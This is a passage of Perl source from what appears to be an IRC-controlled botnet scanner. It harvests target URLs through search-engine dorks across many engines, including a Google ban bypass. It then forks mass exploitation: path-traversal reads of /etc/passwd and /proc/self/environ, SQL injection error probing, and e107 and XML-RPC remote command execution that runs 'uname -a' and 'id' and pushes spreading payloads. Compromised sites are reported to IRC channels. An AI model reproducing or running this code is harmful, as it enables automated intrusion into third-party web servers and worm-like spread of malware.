		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../etc/passwd%00".$colz{1}." ]");}}}

		else {
			$q = bukasitus("http://".$situs.$bug.$xsslfitst);
			if ($q =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/)				{ irc_msg($chan,"[".$colz{9}."XSSLFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../etc/passwd/[512b]/..".$colz{1}."]");		}			
		}
	}
        }
      }
      exit(0);
    }
    $num++;
  }
  irc_msg($chan,$colz{14}."MeNunGGu ".scalar(@prosesbaru)." PID ProSes EksPLoiTasi..") if (!$engine);
  foreach my $f (@prosesbaru) { waitpid($f,0); }
  irc_msg($chan,$colz{4}." $engine FiNizZ! ") if ($engine);
}

sub crsql_eksploit {
  my ($chan,$bug,$dork,$tf,$engine,$type) = @_;
  my @prosesbaru;
  my @semuatarget;
  my $hitung;
  my $num = 0;
  unless (open(FILEZ,"< $tf")) { msge($chan,"FILE",$colz{4}."Ga BiSa BuKa $tf!"); return; }
  while (my $r = <FILEZ>) { $r =~ s/\n//g; push(@semuatarget,$r); }
  close(FILEZ);
  f_hapus($tf);
  my @kotor = lnk_sortir(@semuatarget);
  my @target = lnk_filter(@kotor);
  foreach my $situs (@target) {
    $hitung++;
    if ($hitung % $conf{rfipid} == 0) {
      foreach my $f (@prosesbaru) { waitpid($f,0); }
      $num = 0;
    }
    if ($hitung % $conf{rficnt2} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,$colz{14}." $engine ".$colz{13}." ".$hitung." ".$colz{1}."=> ".$colz{12}." ".scalar(@target). " ");
    }
    $prosesbaru[$num] = fork();
    if ($prosesbaru[$num] == 0) {
	my $q;
	if ($type == 1){
		$q = bukasitus("http://".$situs.$bug.$sqltest);
	} elsif ($type == 2){
		$q = bukasituscrxml("http://".$situs.$bug,"uname -a");
	}elsif ($type == 3){
		$q = bukasituscre107("http://".$situs.$bug,"CASPER VURN");
	}elsif ($type == 4){
		$q = bukasitus("http://".$situs.$bug.$xsslfitst);
	}
	if ($q =~ /sql syntax/) 							{ irc_msg($chan,"[".$colz{9}."SQL".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : sql syntax");			}
	elsif ($q =~ /sql error/) 							{ irc_msg($chan,"[".$colz{9}."SQL".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : sql error");			}
	elsif ($q =~ /right syntax to use near/)					{ irc_msg($chan,"[".$colz{9}."SQL".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : right syntax to use near");	}
	elsif ($q =~ /syntax error converting/)						{ irc_msg($chan,"[".$colz{9}."SQL".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : syntax error converting");	}
	elsif ($q =~ /unclosed quotation/) 						{ irc_msg($chan,"[".$colz{9}."SQL".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : unclosed quotation");		}
	elsif (($q =~ /e107/) && ($q =~ /casper(.*)kae/))				{ my $uname = $1; $uname=~s/\n//;	$uname=~s/\r//; my $cekuname = $uname; if($cekuname =~ /php_uname/){ $uname = ""; } if($cekuname =~ /http/){ $uname = ""; } if($cekuname =~ /</){ $uname = ""; } bukasituscre107spred("http://".$situs.$bug,$caspercmd); bukasituscre107spred("http://".$situs.$bug,$e107sprd3); bukasituscre107spred("http://".$situs.$bug,$e107sprd2); bukasituscre107spred("http://".$situs.$bug,$e107sprd);
											  my $e107safe = bukasituscre107("http://".$situs.$bug,"id"); if ($e107safe =~ /uid=/){
											  irc_msg($dbgchan,"[".$colz{9}."e107".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."] ".$colz{1}."[".$colz{4}."OFF".$colz{1}."] ".$colz{14}.$uname); irc_msg($chan,"[".$colz{9}."e107".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."] ".$colz{1}."[".$colz{4}."OFF".$colz{1}."] ".$colz{14}.$uname); } else {
											  irc_msg($chan,"[".$colz{9}."e107".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."] ".$colz{1}."[".$colz{4}."ON" .$colz{1}."] ".$colz{14}.$uname);  }}
	elsif (($q =~ /casper(.*)kae/s) && ($bug !~ /contact.php/))			{ my $uname = $1; $uname=~s/\n//;	$uname=~s/\r//; my $cekuname = $uname; if($cekuname =~ /uname -a/){ $uname = ""; } if($cekuname =~ /http/){ $uname = ""; } if($cekuname =~ /</){ $uname = ""; }
											  irc_msg($chan,"[".$colz{9}."XML".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."] ".$colz{14}.$uname); bukasituscrxml("http://".$situs.$bug,$e107cmdsp2); bukasituscrxml("http://".$situs.$bug,$e107cmdsp); }
	elsif ($q =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/)				{ irc_msg($chan,"[".$colz{9}."XSSLFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../etc/passwd/[512b]/..".$colz{1}."]");		}
	exit(0);
    }
    $num++;
  }
  irc_msg($chan,$colz{14}."MeNunGGu ".scalar(@prosesbaru)." PID ProSes EksPLoiTasi..") if (!$engine);
  foreach my $f (@prosesbaru) { waitpid($f,0); }
  irc_msg($chan,$colz{4}." $engine FiNizZ! ") if ($engine);
}
###########################
##[ RUTIN SEARCH ENGINE ]##
###########################
sub s_cari {
  #Type: 1 = Cari saja, 2 = Cari dan eksploit, 3 = Cari dan eksploit Joomla
  my ($chan,$dork,$nf,$bug,$type) = @_;
  my @engz;
  my $key = $dork;
  $dork = urlen($key);
  $engz[0]  = fork(); if ($engz[0]  == 0) { s_engine("google",		"Google"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[1]  = fork(); if ($engz[1]  == 0) { s_engine("netscape",	"Netscape"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[2]  = fork(); if ($engz[2]  == 0) { s_engine("yahoo",		"Yahoo"		,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[3]  = fork(); if ($engz[3]  == 0) { s_engine("live",		"Live"		,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[4]  = fork(); if ($engz[4]  == 0) { s_engine("google2",		"Google2"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[5]  = fork(); if ($engz[5]  == 0) { s_engine("altavista",	"Altavista"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[6]  = fork(); if ($engz[6]  == 0) { s_engine("alltheweb",	"AllTheWeb"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[7]  = fork(); if ($engz[7]  == 0) { s_engine("goodsrch",	"GoodSearch"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[8]  = fork(); if ($engz[8]  == 0) { s_engine("lycos",		"Lycos"		,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[9]  = fork(); if ($engz[9]  == 0) { s_engine("uol",		"Uol"		,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[10] = fork(); if ($engz[10] == 0) { s_engine("virgilio",	"Virgilio"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[11] = fork(); if ($engz[11] == 0) { s_engine("webde",		"Web.de"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[12] = fork(); if ($engz[12] == 0) { s_engine("clusty",		"Clusty"	,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[13] = fork(); if ($engz[13] == 0) { s_engine("hotbot",		"Hotbot"	,$type,$chan,$bug,$dork,$nf); exit; }
  foreach my $e (@engz) { waitpid($e,0); }
}

sub crsql_cari {
  my ($chan,$bug,$dork,$nf,$type) = @_;
  my @engz;
  my $key = $dork;
  $dork = urlen($key);
  $engz[0]  = fork(); if ($engz[0]  == 0) { crsql_engine("google",	"Google"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[1]  = fork(); if ($engz[1]  == 0) { crsql_engine("netscape",	"Netscape"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[2]  = fork(); if ($engz[2]  == 0) { crsql_engine("yahoo",	"Yahoo"		,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[3]  = fork(); if ($engz[3]  == 0) { crsql_engine("live",	"Live"		,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[4]  = fork(); if ($engz[4]  == 0) { crsql_engine("google2",	"Google2"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[5]  = fork(); if ($engz[5]  == 0) { crsql_engine("altavista",	"Altavista"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[6]  = fork(); if ($engz[6]  == 0) { crsql_engine("alltheweb",	"AllTheWeb"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[7]  = fork(); if ($engz[7]  == 0) { crsql_engine("goodsrch",	"GoodSearch"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[8]  = fork(); if ($engz[8]  == 0) { crsql_engine("lycos",	"Lycos"		,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[9]  = fork(); if ($engz[9]  == 0) { crsql_engine("uol",		"Uol"		,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[10] = fork(); if ($engz[10] == 0) { crsql_engine("virgilio",	"Virgilio"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[11] = fork(); if ($engz[11] == 0) { crsql_engine("webde",	"Web.de"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[12] = fork(); if ($engz[12] == 0) { crsql_engine("clusty",	"Clusty"	,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[13] = fork(); if ($engz[13] == 0) { crsql_engine("hotbot",	"Hotbot"	,$chan,$bug,$dork,$nf,$type); exit; }
  foreach my $e (@engz) { waitpid($e,0); }
}

sub crsql_engine {
    my ($f,$se,$chan,$bug,$dork,$ef,$type) = @_;
    my @hc;
    if    ($f eq "google"   ) { @hc = se_google($chan,$dork,$ef); }
    elsif ($f eq "google2"  ) { @hc = se_google_m($chan,$dork,$ef); }
    elsif ($f eq "yahoo"    ) { @hc = se_yahoo($chan,$dork,$ef); }
    elsif ($f eq "altavista") { @hc = se_altavista($chan,$dork,$ef); }
    elsif ($f eq "alltheweb") { @hc = se_alltheweb($chan,$dork,$ef); }
    elsif ($f eq "goodsrch" ) { @hc = se_goodsearch($chan,$dork,$ef); }
    elsif ($f eq "lycos"    ) { @hc = se_lycos($chan,$dork,$ef); }
    elsif ($f eq "live"     ) { @hc = se_live($chan,$dork,$ef); }
    elsif ($f eq "hotbot"   ) { @hc = se_hotbot($chan,$dork,$ef); }
    elsif ($f eq "virgilio" ) { @hc = se_virgilio($chan,$dork,$ef); }
    elsif ($f eq "webde"    ) { @hc = se_webde($chan,$dork,$ef); }
    elsif ($f eq "uol"      ) { @hc = se_uol($chan,$dork,$ef); }
    elsif ($f eq "netscape" ) { @hc = se_netscape($chan,$dork,$ef); }
    elsif ($f eq "clusty"   ) { @hc = se_clusty($chan,$dork,$ef); }
    my @cl = lnk_sortir(@hc);
    msgr($chan,$colz{12}.$se,$colz{13}." ".scalar(@hc),$colz{14}."=(".$colz{13}."link".$colz{14}.")=>".$colz{7}." ".scalar(@cl));
    if (scalar(@cl) == 0) { exit; }

      my $ef2 = $f.$ef;
      foreach my $e (@cl) { f_simpan($ef2,$e); }
      crsql_eksploit($chan,$bug,$dork,$ef2,$se,$type);
}

sub s_engine {
    my ($f,$se,$type,$chan,$bug,$dork,$ef) = @_;
    my @hc;
    if    ($f eq "google"   ) { @hc = se_google($chan,$dork,$ef); }
    elsif ($f eq "google2"  ) { @hc = se_google_m($chan,$dork,$ef); }
    elsif ($f eq "yahoo"    ) { @hc = se_yahoo($chan,$dork,$ef); }
    elsif ($f eq "altavista") { @hc = se_altavista($chan,$dork,$ef); }
    elsif ($f eq "alltheweb") { @hc = se_alltheweb($chan,$dork,$ef); }
    elsif ($f eq "goodsrch" ) { @hc = se_goodsearch($chan,$dork,$ef); }
    elsif ($f eq "lycos"    ) { @hc = se_lycos($chan,$dork,$ef); }
    elsif ($f eq "live"     ) { @hc = se_live($chan,$dork,$ef); }
    elsif ($f eq "hotbot"   ) { @hc = se_hotbot($chan,$dork,$ef); }
    elsif ($f eq "virgilio" ) { @hc = se_virgilio($chan,$dork,$ef); }
    elsif ($f eq "webde"    ) { @hc = se_webde($chan,$dork,$ef); }
    elsif ($f eq "uol"      ) { @hc = se_uol($chan,$dork,$ef); }
    elsif ($f eq "netscape" ) { @hc = se_netscape($chan,$dork,$ef); }
    elsif ($f eq "clusty"   ) { @hc = se_clusty($chan,$dork,$ef); }
    my @cl = lnk_sortir(@hc);
    msgr($chan,$colz{12}.$se,$colz{13}." ".scalar(@hc),$colz{14}."=(".$colz{13}."link".$colz{14}.")=>".$colz{7}." ".scalar(@cl));
    if (scalar(@cl) == 0) { exit; }
    if ($type == 1) { foreach my $e (@cl) { f_simpan($ef,$e); } }
    else {
      my $ef2 = $f.$ef;
      foreach my $e (@cl) { f_simpan($ef2,$e); }
      if    ($type == 2) { s_eksploit(2,$chan,$bug,$dork,$ef2,$se); }
      elsif ($type == 3) { s_eksploit(3,$chan,$bug,$dork,$ef2,$se); }
    }
}
##[ GOOGLE ]##
sub se_google {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000; my $p = 0;
  my $url = "http://www.google.id/search?q=".$key."$num=".$num."&filter=0&start=".$p;
  my $murl = "http://www.google.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q !~ /2010 Google/ ) { msge($chan,$colz{9}."Google",$colz{4}."Baned!!"); msge($chan,$colz{9}."Google bypas:",$colz{14}.$bypass."key=".$colz{9}.$key); @daftar = se_gbypass($chan,$key,$nf); }
  if ( $q =~ /dari sekitar <b>(.+?)<\/b>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{9}."Google",$colz{13}." $h");
  }
  if ( $q =~ /class=b><a href=\"(.*?)\">/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Google","$nxurl");}
  }
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  for ($p=50;$p<=$max;$p+=$num) {
    $nxurl = "http://www.google.id/search?q=".$key."$num=".$num."&filter=0&start=".$p;
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
    if ( $q !~ /<h3 class=r><a href=\"http:\/\/(.*?)\"/ ) { return @daftar;  }
  }
  return @daftar;
}
##[ GOOGLE BYPASS ]##
sub se_gbypass {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 1000; my $p = 0;
  my $url = $bypass."?key=".$key."&max=".$max;
  my $nxurl;
  my $q = bukasitus($url);
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
  return @daftar;
}
##[ GOOGLE MULTI DOMAIN ]##
sub se_google_m {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000; my $p;
  my @doms = (
    "com","ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
    "ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
    "com.tr","com.tw","com.ua","co.uk","hu","com.af","com","ae","com.ag","com.ai","am","com.ar","as",
    "at","com.au","az","ba","com.bd","be","bg","com.bh","bi","com.bn","com.bo","com.bn","bs","co.bw",
    "com.by","com.bz","ca","cd","cg","ch","ci","co.ck","cl","cn","com.co","co.cr","com.cu","cz","de",
    "dj","dk","dm","com.do","com.ec","ee","com.eg","es","com.et","fi","com.fj","fm","fr","ge","gg",
    "com.gi","gl","gm","gp","gr","com.gt","gy","com.hk","hn","hr","ht","hu","co.id","ie","co.il",
    "im","co.in","is","it","je","com.jm","jo","co.jp","co.ke","com.kh","ki","kg","co.kr","kz","la",
    "li","lk","co.ls","lt","lu","lv","com.ly","co.ma","md","mn","ms","com.mt","mu","mv","mw","com.mx",
    "com.my","com.na","com.nf","com.ng","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa",
    "com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","com.qa","ro","ru","rw","com.sa","com.sb",
    "sc","se","com.sg","sh","si","sk","sn","sm","st","com.sv","co.th","com.tj","tk","tm","to","tp","com.tr",
    "tt","com.tw","com.ua","co.ug","co.uk","com.uy","co.uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws",
    "co.yu","co.za","co.zm","co.zw");
  my $dom = $doms[rand(scalar(@doms))];
  my $url = "http://www.google.".$dom."/search?num=".$num."&q=".$key."&filter=0";
  my $murl = "http://www.google.".$dom;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /class=b><a href=\"(.*?)\">/ ) {
      my $nxurl = $1;
      if ($conf{showdbse} == 1){msgn($dbgchan,"Google.".$dom,$nxurl);}
      msgn($chan,$colz{9}."Google.".$dom,$colz{12}."LaGi NyAri..");
  }
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  for ($p=50;$p<=$max;$p+=$num) {
    $nxurl = "http://www.google.".$dom."/search?num=".$num."&q=".$key."&start=".$p."&sa=N";
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
    if ( $q !~ /<h3 class=r><a href=\"http:\/\/(.*?)\"/ ) { return @daftar;  }
  }
  return @daftar;
}
##[ YAHOO ]##
sub se_yahoo {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 8000; my $p = "1";
  my $url = "http://search.yahoo.com/search?p=".$key."&b=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /id=\"infotext\"><p> .*? of(.*?) for/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{9}."Yahoo",$colz{13}." $h");
  }
  if ( $q =~ /999 Unable to process request at this time/ ) { msge($chan,$colz{9}."Yahoo",$colz{4}."Banned!"); }
  if ( $q =~ /<a id=\"pg-next\" href=\"(.*?)\">Next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Yahoo","$nxurl");}
  }
  while ( $q =~ m/26u=(.*?)%26w=/g ) { push (@daftar, $1); }
  while ( $q =~ /<a id=\"pg-next\" href=\"(.*?)\">Next/ ) {
    $p++; if ( $p > $max ) { return @daftar; }
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/26u=(.*?)%26w=/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ ALTAVISTA ]##
sub se_altavista {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 100; my $max = 500; my $p;
  my $url = "http://www.altavista.com/web/results?itag=ody&q=".$key."&kgs=0&kls=0&nbq=".$num."&stq=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a href=\"(.*?)\" target=\"_self\">Next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Altavista","$nxurl");}
  }
  while ( $q =~ m/<span class=ngrn>(.*?) <\/span>/g ) { push (@daftar, $1); }
  while ( $q =~ /<a href=\"(.*?)\" target=\"_self\">Next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<span class=ngrn>(.*?) <\/span>/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ ALLTHEWEB ]##
sub se_alltheweb {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 100; my $max = 20; my $p = 1;
